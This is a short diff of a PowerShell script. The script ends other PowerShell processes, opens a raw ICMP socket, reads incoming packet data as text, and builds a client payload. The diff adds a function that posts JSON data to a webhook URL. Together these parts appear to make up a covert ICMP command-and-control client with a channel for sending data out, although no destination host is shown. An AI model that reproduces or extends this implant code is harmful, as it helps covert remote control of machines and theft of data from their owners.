@@ -4,7 +4,6 @@ $F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.
 (Get-Process | Where-Object {$_.ProcessName -eq "powershell" -and $_.Id -ne $PID} | Select-Object -ExpandProperty Id) | % {Stop-Process -Id $_ -Force}
 [char]$EL = 14
 
-
 $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0])
 $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
 $pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
@@ -19,6 +18,15 @@ function ret {
   $FeedBack = ([System.Text.Encoding]::ASCII.GetString($script:buffer[28..$pRs.ReceiveBufferSize]))
   $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf($script:EL)))) 
   return $FeedBack
+}
+
+function Send-Webhook {
+  param(
+      [string]$WebhookUrl,
+      [object]$Data
+  )
+  $json = $Data | ConvertTo-Json
+  Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $json -ContentType "application/json"
 }
 $payload = @{
   "Client"       = "$($VERSION)"
